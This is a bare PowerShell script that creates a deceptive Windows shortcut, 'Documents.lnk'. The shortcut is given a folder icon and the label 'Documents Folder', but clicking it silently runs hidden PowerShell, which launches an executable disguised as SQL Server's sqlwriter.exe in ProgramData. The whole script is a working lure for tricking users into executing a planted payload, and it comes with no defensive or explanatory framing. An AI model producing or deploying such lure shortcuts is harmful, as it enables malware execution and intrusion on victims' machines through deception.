$targetPath = "C:\ProgramData\Microsoft SQL Server\90\Shared\sqlwriter.exe"

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\temp\mnt\Documents.lnk")

$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Command `"Start-Process -FilePath '$targetPath' -WindowStyle Hidden`""
$Shortcut.WorkingDirectory = "C:\ProgramData\Microsoft SQL Server\90\Shared"
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,4"
$Shortcut.Description = "Documents Folder"
$Shortcut.Save()